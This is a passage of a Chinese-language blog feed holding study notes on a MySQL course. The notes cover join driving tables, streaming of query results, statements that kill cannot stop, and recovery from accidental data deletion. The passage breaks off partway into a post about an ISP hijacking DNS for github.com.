结果里面，Extra 字段里面有没有出现“Block Nested Loop”字样。</p><p>第二个问题是：如果要使用 join，应该选择大表做驱动表还是选择小表做驱动表？</p><ol><li>如果是 Index Nested-Loop Join 算法，应该选择小表做驱动表；</li><li>如果是 Block Nested-Loop Join 算法：<ul><li>在 join_buffer_size 足够大的时候，是一样的；</li><li>在 join_buffer_size 不够大的时候（这种情况更常见），应该选择小表做驱动表。</li></ul></li></ol><p>所以，这个问题的结论就是，总是应该使用小表做驱动表。</p><p>当然了，这里我需要说明下，什么叫作“小表”，并不是说哪张表的数据量小，哪个就是小表。</p><p>我们前面的例子是没有加条件的。如果我在语句的 where 条件加上 t2.id&lt;=50 这个限定条件，再来看下这两条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from t1 straight_join t2 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;50;</span><br><span class="line">select * from t2 straight_join t1 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;50;</span><br></pre></td></tr></table></figure><p>注意，为了让两条语句的被驱动表都用不上索引，所以 join 字段都使用了没有索引的字段 b。</p><p>但如果是用第二个语句的话，join_buffer 只需要放入 t2 的前 50 行（t1 表需要把每一行取出来，跟 join_buffer 中的数据做对比），显然是更好的。所以这里，“t2 的前 50 行”是那个相对小的表，也就是“小表”。</p><p>我们再来看另外一组例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select t1.b,t2.* from  t1  straight_join t2 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;100;</span><br><span class="line">select t1.b,t2.* from  t2  straight_join t1 on (t1.b&#x3D;t2.b) where t2.id&lt;&#x3D;100;</span><br></pre></td></tr></table></figure><p>这个例子里，表 t1 和 t2 都是只有 100 行参加 join。但是，这两条语句每次查询放入 join_buffer 中的数据是不一样的：</p><p>表 t1 只查字段 b，因此如果把 t1 放到 join_buffer 中，则 join_buffer 中只需要放入 b 的值；<br>表 t2 需要查所有的字段，因此如果把表 t2 放到 join_buffer 中的话，就需要放入三个字段 id、a 和 b。<br>这里，我们应该选择表 t1 作为驱动表。也就是说在这个例子里，“只需要一列参与 join 的表 t1”是那个相对小的表。</p><p>所以，更准确地说，<strong>在决定哪个表做驱动表的时候，应该是两个表按照各自的条件过滤，过滤完成之后，计算参与 join 的各个字段的总数据量，数据量小的那个表，就是“小表”，应该作为驱动表</strong>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>如果可以使用被驱动表的索引，join 语句还是有其优势的</li><li>不能使用被驱动表的索引，只能使用 Block Nested-Loop Join 算法，这样的语句就尽量不要使用</li><li>在使用 join 的时候，应该让小表做驱动表</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>33 我查这么多数据，会不会把数据库内存打爆</title>
      <link href="/if-I-check-so-much-data-will-it-blow-up-the-database-memory/"/>
      <url>/if-I-check-so-much-data-will-it-blow-up-the-database-memory/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解全部扫描对 Server 层的影响</li></ul><a id="more"></a><h2 id="全表扫描对-server-层的影响"><a href="#全表扫描对-server-层的影响" class="headerlink" title="全表扫描对 server 层的影响"></a>全表扫描对 server 层的影响</h2><p>假设，现在需要对一个 200G 的 InnoDB 表 db1. t，执行一个全表扫描。当然，你要把扫描结果保存在客户端，会使用类似这样的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h$host -P$port -u$user -p$pwd -e &quot;select * from db1.t&quot; &gt; target_file.sql</span><br></pre></td></tr></table></figure><p>InnoDB 的数据是保存在主键索引上的，所以全表扫描实际上是直接扫描表 t 的主键索引。这条查询语句由于没有其他的判断条件，所以查到的每一行都可以直接放到结果集里面，然后返回给客户端。</p><p>那么，这个“结果集”存在哪里呢？</p><p>实际上，服务端并不需要保存一个完整的结果集。取数据和发数据的流程是这样的：</p><ol><li>获取一行，写到 net_buffer 中。这块内存的大小是由参数 net_buffer_length 定义的，默认是 16k。</li><li>重复获取行，直到 net_buffer 写满，调用网络接口发出去。</li><li>如果发送成功，就清空 net_buffer，然后继续取下一行，并写入 net_buffer。</li><li>如果发送函数返回 EAGAIN 或 WSAEWOULDBLOCK，就表示本地网络栈（socket send buffer）写满了，进入等待。直到网络栈重新可写，再继续发送。</li></ol><p>这个过程对应的流程图如下所示。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816143632.png" alt=""></p><p>从这个流程中，可以看到：</p><ol><li>一个查询在发送过程中，占用的 MySQL 内部的内存最大就是 net_buffer_length 这么大，并不会达到 200G</li><li>socket send buffer 也不可能达到 200G（默认定义 /proc/sys/net/core/wmem_default），如果 socket send buffer 被写满，就会暂停读数据的流程。</li></ol><p>也就是说，<strong>MySQL 是“边读边发的”</strong>，这个概念很重要。这就意味着，<strong>如果客户端接收得慢，会导致 MySQL 服务端由于结果发不出去，这个事务的执行时间变长</strong>。</p><p>比如下面这个状态，就是我故意让客户端不去读 socket receive buffer 中的内容，然后在服务端 show processlist 看到的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816143838.png" alt="服务端发送阻塞"></p><p>如果你看到 State 的值一直处于“Sending to client”，就表示服务器端的网络栈写满了。</p><p>在上一篇文章中曾提到，如果客户端使用–quick 参数，会使用 mysql_use_result 方法。这个方法是读一行处理一行。你可以想象一下，假设有一个业务的逻辑比较复杂，每读一行数据以后要处理的逻辑如果很慢，就会导致客户端要过很久才会去取下一行数据，可能就会出现上图所示的这种情况。</p><p>因此，对于正常的线上业务来说，如果一个查询的返回结果不会很多的话，我都建议你使用 mysql_store_result 这个接口，直接把查询结果保存到本地内存（Mysql 默认正是 mysql_store_result 这个接口）。</p><p>另一方面，如果你在自己负责维护的 MySQL 里看到很多个线程都处于“Sending to client”这个状态，就意味着你要让业务开发同学优化查询结果，并评估这么多的返回结果是否合理。</p><p>而如果要快速减少处于这个状态的线程的话，将 net_buffer_length 参数设置为一个更大的值是一个可选方案。</p><p>与“Sending to client”长相很类似的一个状态是“Sending data”，这是一个经常被误会的问题。有同学问我说，在自己维护的实例上看到很多查询语句的状态是“Sending data”，但查看网络也没什么问题啊，为什么 Sending data 要这么久？</p><p>实际上，一个查询语句的状态变化是这样的（注意：省略了其他无关的状态）：</p><ol><li>MySQL 查询语句进入执行阶段后，首先把状态设置成“Sending data”；</li><li>然后，发送执行结果的列相关的信息（meta data) 给客户端；</li><li>再继续执行语句的流程；</li><li>执行完成后，把状态设置成空字符串。</li></ol><p>也就是说，“Sending data”并不一定是指“正在发送数据”，而可能是处于执行器过程中的任意阶段。比如，你可以构造一个锁等待的场景，就能看到 Sending data 状态。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816145620.png" alt=""><br>可以看到，session B 明显是在等锁，状态却显示为 Sending data。</p><p>MySQL 采用的是边算边发的逻辑，因此对于数据量很大的查询结果来说，不会在 server 端保存完整的结果集。所以，如果客户端读结果不及时，会堵住 MySQL 的查询过程，但是不会把内存打爆。</p><p>全表扫描还是比较耗费 IO 资源的，所以业务高峰期还是不能直接在线上主库执行全表扫描的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>查询的结果是分段发给客户端的，因此扫描全表，查询返回大量的数据，并不会把内存打爆。</li><li>查询返回的结果不多的话，建议使用 mysql_store_result 这个接口（默认），如果查询返回的结果集很多，那么这个时候就需要改用 mysql_use_result 接口了。</li><li>将 net_buffer_length 的值设置更大，可以解决多个线程都处于“Sending to client” 的状态。</li><li>仅当一个线程处于“等待客户端接收结果”的状态，才会显示”Sending to client”；而如果显示成“Sending data”，并不一定是指“正在发送数据”，而可能是处于执行器过程中的任意阶段。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32 为什么还有kill不掉的语句</title>
      <link href="/why-is-there-a-statement-that-cannot-be-killed/"/>
      <url>/why-is-there-a-statement-that-cannot-be-killed/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 MySQL 中的两个 kill 命令的区别</li><li>理解 kill 命令背后的原理</li></ul><a id="more"></a><p>在 MySQL 中有两个 kill 命令：</p><ul><li>一个是 kill query + 线程 id，表示终止这个线程中正在执 行的语句;</li><li>一个是 kill connection + 线程 id，这里 connection 可缺省，表示断开这个线 程的连接，当然如果这个线程有语句正在执行，也是要先停止正在执行的语句的。</li></ul><p>大多数情况下，kill query/connection 命令是有效的。比如，执行一个查询的过程中，发现执行时间太久，要放弃继续查询，这时我们就可以用 kill query 命令，终止这条查询语句。</p><p>还有一种情况是，语句处于锁等待的时候，直接使用 kill 命令也是有效的。我们一起来看下这个例子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220812134323.png" alt=""><br>可以看到，session C 执行 kill query 以后，session B 几乎同时就提示了语句被中断。 这就是我们预期的结果。</p><h2 id="收到-kill-以后，线程做什么"><a href="#收到-kill-以后，线程做什么" class="headerlink" title="收到 kill 以后，线程做什么"></a>收到 kill 以后，线程做什么</h2><p>但是，这里你要停下来想一下：session B 是直接终止掉线程，什么都不管就直接退出吗？显然，这是不行的。</p><p>当对一个表做增删改查操作时，会在表上加 MDL 读锁。所以，session B 虽然处于 blocked 状态，但还是拿着一个 MDL 读锁的。如果线程被 kill 的时候，就直接终止，那之后这个 MDL 读锁就没机会被释放了。</p><p>这样看来，kill 并不是马上停止的意思，而是告诉执行线程说，这条语句已经不需要继续执行了，可以开始“执行停止的逻辑了”。</p><blockquote><p>其实，这跟 Linux 的 kill 命令类似，kill -N pid 并不是让进程直接停止，而是给进程发一个信号，然后进程处理这个信号，进入终止逻辑。只是对于 MySQL 的 kill 命令来说，不需要传信号量参数，就只有“停止”这个命令。</p></blockquote><p>实现上，当用户执行 kill query thread_id_B 时，MySQL 里处理 kill 命令的线程做了两件事：</p><ol><li>把 session B 的运行状态改成 THD::KILL_QUERY(将变量 killed 赋值为 THD::KILL_QUERY)</li><li>给 session B 的执行线程发一个信号</li></ol><p>为什么要发信号呢？</p><p>因为像图 1 的我们例子里面，session B 处于锁等待状态，如果只是把 session B 的线程状态设置 THD::KILL_QUERY，线程 B 并不知道这个状态变化，还是会继续等待。发一个信号的目的，就是让 session B 退出等待，来处理这个 THD::KILL_QUERY 状态。</p><p>上面的分析中，隐含了这么三层意思：</p><ol><li>一个语句执行过程中有多处“埋点”，在这些“埋点”的地方判断线程状态，如果发现线程状态是 THD::KILL_QUERY，才开始进入语句终止逻辑</li><li>如果处于等待状态，必须是一个可以被唤醒的等待，否则根本不会执行到“埋点”处</li><li>语句从开始进入终止逻辑，到终止逻辑完全完成，是有一个过程的</li></ol><p>所以 kill 操作，不是说停就停的。</p><p>接下来，我们再看一个 kill 不掉的例子，也就是我们在前面第 29 篇文章中提到的 innodb_thread_concurrency 不够用的例子。</p><p>首先，执行 <code>set global innodb_thread_concurrency=2</code>，将 InnoDB 的并发线程上限数 设置为 2;然后，执行下面的序列：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220812142243.png" alt=""><br>可以看到：</p><ol><li>sesssion C 执行的时候被堵住了；</li><li>但是 session D 执行的 kill query C 命令却没什么效果</li><li>直到 session E 执行了 kill connection 命令，才断开了 session C 的连接，提示“Lost connection to MySQL server during query”</li><li>但是这时候，如果在 session E 中执行 show processlist，你就能看到下面这个图</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220812142648.png" alt=""></p><p>这时候，id=12 这个线程的 Commnad 列显示的是 Killed。也就是说，客户端虽然断开了连接，但实际上服务端上这条语句还在执行过程中。</p><p><strong>为什么在执行 kill query 命令时，这条语句不像第一个例子的 update 语句一样退出呢？</strong></p><p>在实现上，等行锁时，使用的是 pthread_cond_timedwait 函数，这个等待状态可以被唤醒。但是，在这个例子里，12 号线程的等待逻辑是这样的：每 10 毫秒判断一下是否可以进入 InnoDB 执行，如果不行，就调用 nanosleep 函数进入 sleep 状态。</p><p>也就是说，虽然 12 号线程的状态已经被设置成了 KILL_QUERY，但是在这个等待进入 InnoDB 的循环过程中，并没有去判断线程的状态，因此根本不会进入终止逻辑阶段。</p><p>而当 session E 执行 kill connection 命令时，是这么做的：</p><ol><li>把 12 号线程状态设置为 KILL_CONNECTION</li><li>关掉 12 号线程的网络连接。因为有这个操作，所以你会看到，这时候 session C 收到了断开连接的提示</li></ol><p>那为什么执行 show processlist 的时候，会看到 Command 列显示为 killed 呢？其实，这就是因为在执行 show processlist 的时候，有一个特别的逻辑：如果一个线程的状态是 KILL_CONNECTION，就把 Command 列显示成 Killed。</p><p><strong>所以其实，即使是客户端退出了，这个线程的状态仍然是在等待中。</strong></p><p>那这个线程什么时候会退出呢？</p><p>答案是，只有等到满足进入 InnoDB 的条件后，session C 的查询语句继续执行，然后才有可能判断到线程状态已经变成了 KILL_QUERY 或者 KILL_CONNECTION，再进入终止逻辑阶段。</p><p>到这里，我们来小结一下。</p><p><strong>这个例子是 kill 无效的第一类情况，即：线程没有执行到判断线程状态的逻辑。</strong> 跟这种情况相同的，还有由于 IO 压力过大，读写 IO 的函数一直无法返回，导致不能及时判断线程的状态。</p><p><strong>另一类情况是，终止逻辑耗时较长。</strong> 这时候，从 show processlist 结果上看也是 Command=Killed，需要等到终止逻辑完成，语句才算真正完成。这类情况，比较常见的场景有以下几种：</p><ol><li>超大事务执行期间被 kill。这时候，回滚操作需要对事务执行期间生成的所有新数据版本做回收操作，耗时很长。</li><li>大查询回滚。如果查询过程中生成了比较大的临时文件，加上此时文件系统压力大，删除临时文件可能需要等待 IO 资源，导致耗时较长。</li><li>DDL 命令执行到最后阶段，如果被 kill，需要删除中间过程的临时文件，也可能受 IO 资源影响耗时较久。</li></ol><p>这里有一个问题：如果直接在客户端通过 Ctrl+C 命令，是不是就可以直接终止线程呢？</p><p>答案是，不可以。</p><p>这是因为，其实在客户端的操作只能操作到客户端的线程，客户端和服务端只能通过网络交互，是不可能直接操作服务端线程的。</p><p>而由于 MySQL 是停等协议，所以这个线程执行的语句还没有返回的时候，再往这个连接里面继续发命令也是没有用的。实际上，执行 Ctrl+C 的时候，是 MySQL 客户端另外启动一个连接，然后发送一个 kill query 命令。</p><p>所以，你可别以为在客户端执行完 Ctrl+C 就万事大吉了。因为，要 kill 掉一个线程，还涉及到后端的很多操作。</p><h2 id="关于客户端的另一个误解"><a href="#关于客户端的另一个误解" class="headerlink" title="关于客户端的另一个误解"></a>关于客户端的另一个误解</h2><p>最常见的一个误解就是：如果库里面的表特别多，连接就会很慢。</p><p>从第一篇文章就可以知道，每个客户端在和服务端建立连接的时候，需要做的事情就是 TCP 握手、用户校验、获取权限。但这几个操作，显然跟库里面表的个数无关。</p><p>但实际上，正如图中的文字提示所说的，当使用默认参数连接的时候，MySQL 客户端会提供一个本地库名和表名补全的功能。为了实现这个功能，客户端在连接成功后，需要多做一些操作：</p><ol><li>执行 show databases；</li><li>切到指定库，执行 show tables；</li><li>把这两个命令的结果用于构建一个本地的哈希表</li></ol><p>在这些操作中，最花时间的就是第三步在本地构建哈希表的操作（用于 Tab 键自动补全表名或者显示提示）。所以，当一个库中的表个数非常多的时候，这一步就会花比较长的时间。</p><p>也就是说，我们感知到的连接过程慢，其实并不是连接慢，也不是服务端慢，而是客户端慢。</p><p>MySQL 客户端发送请求后，接收服务端返回结果的方式有两种：</p><ol><li>一种是本地缓存，也就是在本地开一片内存，先把结果存起来。如果你用 API 开发，对应的就是 mysql_store_result 方法。</li><li>另一种是不缓存，读一个处理一个。如果你用 API 开发，对应的就是 mysql_use_result 方法。</li></ol><p>MySQL 客户端默认采用第一种方式，而如果加上–quick 参数，就会使用第二种不缓存的方式。</p><p>解决这个问题的方案有两个：</p><ol><li>在连接命令中加上 -A 参数</li><li>或者在连接命令中加 –quick(或者简写为 -q) 参数</li></ol><p>两个参数都可以跳过表名自动补全功能。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Mysql kill 不掉的情况，其实是因为发送 kill 命令的客户端，并没有强行停止目标线程的执行，而只是设置了个状态，并唤醒对应的线程。而被 kill 的线程，需要执行到判断状态的“埋点”，才会开始进入终止逻辑阶段。并且，终止逻辑本身也是需要耗费时间的。</li><li>kill connection 本质上只是把客户端的 sql 连接断开，后面的执行流程还是要走 kill query</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>31 误删数据后除了跑路，还能怎么办</title>
      <link href="/after-accidentally-deleting-data-what-else-can-I-do-besides-running-away/"/>
      <url>/after-accidentally-deleting-data-what-else-can-I-do-besides-running-away/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解了不同类型的误删数据之后的解决方案</li><li>了解预防误删库/表的方法</li></ul><a id="more"></a><p>为了找到解决误删数据的更高效的方法，我们需要先对和 MySQL 相关的误删数据，做下 分类:</p><ol><li>使用 delete 语句误删数据行</li><li>使用 drop table 或者 truncate table 语句误删数据表</li><li>使用 drop database 语句误删数据库</li><li>使用 rm 命令误删整个 MySQL 实例</li></ol><h2 id="误删行"><a href="#误删行" class="headerlink" title="误删行"></a>误删行</h2><p>如果是使用 delete 语句误删了数据行，可以用 Flashback 工 具通过闪回把数据恢复回来。</p><p>Flashback 恢复数据的原理，是修改 binlog 的内容，拿回原库重放。而能够使用这个方案 的前提是，需要确保 binlog_format=row 和 binlog_row_image=FULL。<br>具体恢复数据时，对单个事务做如下处理:</p><ol><li>对于 insert 语句，对应的 binlog event 类型是 Write_rows event，把它改成 Delete_rows event 即可;</li><li>同理，对于 delete 语句，也是将 Delete_rows event 改为 Write_rows event;</li><li>而如果是 Update_rows 的话，binlog 里面记录了数据行修改前和修改后的值，对调这<br>两行的位置即可。</li></ol><p>如果误操作不是一个，而是多个，会怎么样呢?比如下面三个事务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(A)delete ... </span><br><span class="line">(B)insert ... </span><br><span class="line">(C)update ...</span><br></pre></td></tr></table></figure><p>现在要把数据库恢复回这三个事务操作之前的状态，用 Flashback 工具解析 binlog 后，写 回主库的命令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(reverse C)update ... </span><br><span class="line">(reverse B)delete ... </span><br><span class="line">(reverse A)insert ...</span><br></pre></td></tr></table></figure><p>也就是说，如果误删数据涉及到了多个事务的话，需要将事务的顺序调过来再执行。</p><p><strong>需要说明的是，我不建议你直接在主库上执行这些操作。</strong></p><p>恢复数据比较安全的做法，是恢复出一个备份，或者找一个从库作为临时库，在这个临时库上执行这些操作，然后再将确认过的临时库的数据，恢复回主库。</p><p>为什么要这么做呢?</p><p>这是因为，一个在执行线上逻辑的主库，数据状态的变更往往是有关联的。可能由于发现数据问题的时间晚了一点儿，就导致已经在之前误操作的基础上，业务代码逻辑又继续修改了其他数据。所以，如果这时候单独恢复这几行数据，而又未经确认的话，就可能会出现对数据的二次破坏。</p><p>当然，<strong>我们不止要说误删数据的事后处理办法，更重要是要做到事前预防</strong>。我有以下两个建议：</p><ol><li>把 sql_safe_updates 参数设置为 on。这样一来，如果我们忘记在 delete 或者 update 语句中写 where 条件，或者 where 条件里面没有包含索引字段的话，这条语句的执行 就会报错。</li><li>代码上线前，必须经过 SQL 审计。</li></ol><p>你可能会说，设置了 sql_safe_updates=on，如果我真的要把一个小表的数据全部删掉， 应该怎么办呢?</p><p>如果你确定这个删除操作没问题的话，可以在 delete 语句中加上 where 条件，比如 where id&gt;=0。</p><p>但是，delete 全表是很慢的，需要生成回滚日志、写 redo、写 binlog。所以，从性能角 度考虑，你应该优先考虑使用 truncate table 或者 drop table 命令。</p><p>使用 delete 命令删除的数据，你还可以用 Flashback 来恢复。而使用 truncate /drop table 和 drop database 命令删除的数据，就没办法通过 Flashback 来恢复了。为什么 呢?</p><p>这是因为，即使我们配置了 binlog_format=row，执行这三个命令时，记录的 binlog 还 是 statement 格式。binlog 里面就只有一个 truncate/drop 语句，这些信息是恢复不出 数据的。</p><p>那么，如果我们真的是使用这几条命令误删数据了，又该怎么办呢?</p><h2 id="误删库-表"><a href="#误删库-表" class="headerlink" title="误删库/表"></a>误删库/表</h2><p>这种情况下，要想恢复数据，就需要使用全量备份，加增量日志的方式了。这个方案要求<strong>线上有定期的全量备份，并且实时备份 binlog。</strong> </p><p>在这两个条件都具备的情况下，假如有人中午 12 点误删了一个库，恢复数据的流程如下:</p><ol><li>取最近一次全量备份，假设这个库是一天一备，上次备份是当天 0 点; 2. 用备份恢复出一个临时库;</li><li>从日志备份里面，取出凌晨 0 点之后的日志;</li><li>把这些日志，除了误删除数据的语句外，全部应用到临时库。</li></ol><p>这个流程的示意图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220811155317.png" alt=""></p><p>关于这个过程，我需要和你说明如下几点:</p><ol><li>为了加速数据恢复，如果这个临时库上有多个数据库，你可以在使用 mysqlbinlog 命令 时，加上一个–database 参数，用来指定误删表所在的库。这样，就避免了在恢复数据 时还要应用其他库日志的情况。</li><li>在应用日志的时候，需要跳过 12 点误操作的那个语句的 binlog：<ul><li>如果原实例没有使用 GTID 模式，只能在应用到包含 12 点的 binlog 文件的时候，先 用–stop-position 参数执行到误操作之前的日志，然后再用–start-position 从误操作 之后的日志继续执行;</li><li>如果实例使用了 GTID 模式，就方便多了。假设误操作命令的 GTID 是 gtid1，那么只 需要执行 set gtid_next=gtid1;begin;commit; 先把这个 GTID 加到临时实例的 GTID 集合，之后按顺序执行 binlog 的时候，就会自动跳过误操作的语句。</li></ul></li></ol><p>不过，即使这样，使用 mysqlbinlog 方法恢复数据还是不够快，主要原因有两个：</p><ol><li>如果是误删表，最好就是只恢复出这张表，也就是只重放这张表的操作，但是 mysqlbinlog 工具并不能指定只解析一个表的日志;</li><li>用 mysqlbinlog 解析出日志应用，应用日志的过程就只能是单线程。我们在第 26 篇文 章中介绍的那些并行复制的方法，在这里都用不上。</li></ol><p>一种加速的方法是，在用备份恢复出临时实例之后，将这个临时实例设置成线上备库的从库，这样：</p><ol><li>在 start slave 之前，先通过执行 change replication filter replicate_do_table = (tbl_name) 命令，就可以让临时库只 同步误操作的表;</li><li>这样做也可以用上并行复制技术，来加速整个数据恢复过程。</li></ol><p>这个过程的示意图如下所示。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220811155510.png" alt=""></p><p>可以看到，图中 binlog 备份系统到线上备库有一条虚线，是指如果由于时间太久，备库上 已经删除了临时实例需要的 binlog 的话，我们可以从 binlog 备份系统中找到需要的 binlog，再放回备库中。</p><p>假设，我们发现当前临时实例需要的 binlog 是从 master.000005 开始的，但是在备库上 执行 show binlogs 显示的最小的 binlog 文件是 master.000007，意味着少了两个 binlog 文件。</p><p>这时，我们就需要去 binlog 备份系统中找到这两个文件。把之前删掉的 binlog 放回备库的操作步骤，是这样的：</p><ol><li>从备份系统下载 master.000005 和 master.000006 这两个文件，放到备库的日志目录 下;</li><li>打开日志目录下的 master.index 文件，在文件开头加入两行，内容分别是 “./master.000005”和“./master.000006”;</li><li>重启备库，目的是要让备库重新识别这两个日志文件;</li><li>现在这个备库上就有了临时库需要的所有 binlog 了，建立主备关系，就可以正常同步了。</li></ol><p>不论是把 mysqlbinlog 工具解析出的 binlog 文件应用到临时库，还是把临时库接到备库 上，这两个方案的共同点是:误删库或者表后，恢复数据的思路主要就是通过备份，再加上 应用 binlog 的方式。</p><p>也就是说，这两个方案都要求备份系统定期备份全量日志，而且需要确保 binlog 在被从本 地删除之前已经做了备份。</p><p>但是，一个系统不可能备份无限的日志，你还需要根据成本和磁盘空间资源，设定一个日志 保留的天数。如果你的 DBA 团队告诉你，可以保证把某个实例恢复到半个月内的任意时间 点，这就表示备份系统保留的日志时间就至少是半个月。</p><p>另外，我建议你不论使用上述哪种方式，都要把这个数据恢复功能做成自动化工具，并且经常拿出来演练。为什么这么说呢?</p><p>这这里的原因，主要包括两个方面：</p><ol><li>虽然“发生这种事，大家都不想的”，但是万一出现了误删事件，能够快速恢复数据， 将损失降到最小，也应该不用跑路了。</li><li>而如果临时再手忙脚乱地手动操作，最后又误操作了，对业务造成了二次伤害，那就说 不过去了。</li></ol><h2 id="预防误删库-表的方法"><a href="#预防误删库-表的方法" class="headerlink" title="预防误删库/表的方法"></a>预防误删库/表的方法</h2><p>虽然常在河边走，很难不湿鞋，但终究还是可以找到一些方法来避免的。所以这里，我也会给你一些减少误删操作风险的建议。</p><p>第一条建议是，账号分离。这样做的目的是，避免写错命令。比如:</p><ol><li>我们只给业务开发同学 DML 权限，而不给 truncate/drop 权限。而如果业务开发人员 有 DDL 需求的话，也可以通过开发管理系统得到支持。</li><li>即使是 DBA 团队成员，日常也都规定只使用只读账号，必要的时候才使用有更新权限的 账号。</li></ol><p>第二条建议是，制定操作规范。这样做的目的，是避免写错要删除的表名。比如：</p><ol><li>在删除数据表之前，必须先对表做改名操作。然后，观察一段时间，确保对业务无影响以后再删除这张表。</li><li>改表名的时候，要求给表名加固定的后缀(比如加 _to_be_deleted)，然后删除表的动作 必须通过管理系统执行。并且，管理系删除表的时候，只能删除固定后缀的表。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>了解了不同类型的误删数据之后的解决方案。</li><li>预防远比处理的意义来得大，可以通过 SQL 审计、账户权限控制、定期检查备份等方式预防。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次运营商劫持 DNS</title>
      <link href="/log-a-carrier-hijacking-dns/"/>
      <url>/log-a-carrier-hijacking-dns/</url>
      
        <content type="html"><![CDATA[<p>最近手机上访问 <code>github.com</code>，直接就是打不开了，起初并没有多想，可能只是网络较差吧。</p><a id="more"></a><p>知道最近写博客时，需要把图片上传到图床上，但是失败了。</p><p>错误日志如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RequestError: Error: connect ECONNREFUSED 127.0.0.1:443</span><br><span class="line">    at new RequestError (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request-promise-core&#x2F;lib&#x2F;errors.js:14:15)</span><br><span class="line">    at Request.plumbing.callback (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request-promise-core&#x2F;lib&#x2F;plumbing.js:87:29)</span><br><span class="line">    at Request.RP$callback [as _callback] (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request-promise-core&#x2F;lib&#x2F;plumbing.js:46:31)</span><br><span class="line">    at self.callback (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request&#x2F;request.js:185:22)</span><br><span class="line">    at Request.emit (events.js:200:13)</span><br><span class="line">    at Request.onRequestError (&#x2F;Applications&#x2F;PicGo.app&#x2F;Contents&#x2F;Resources&#x2F;app.asar&#x2F;node_modules&#x2F;request&#x2F;request.js:877:8)</span><br><span class="line">    at ClientRequest.emit (events.js:200:13)</span><br><span class="line">    at TLSSocket.socketErrorListener (_http_client.js:402:9)</span><br><span class="line">    at TLSSocket.emit (events.js:200:13)</span><br><span class="line">    at emitErrorNT (internal&#x2F;streams&#x2F;destroy.js:91:8)</span><br></pre></td></tr></table></figure><p>看到这个日志之后，我的第一反应是，怎么请求的是 <code>127.0.0.1</code> 呢？</p><p>然后在本地 ping 了一下 <code>github.com</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220820101406.png" alt=""><br>咦，返回的地址竟然是 <code>127.0.0.1</code>，我还以为是设置了本地域名的关系，结果看了一下，并没有<code>github.com</code> 这个域名。</p><p>于是通过站长工具的 DNS 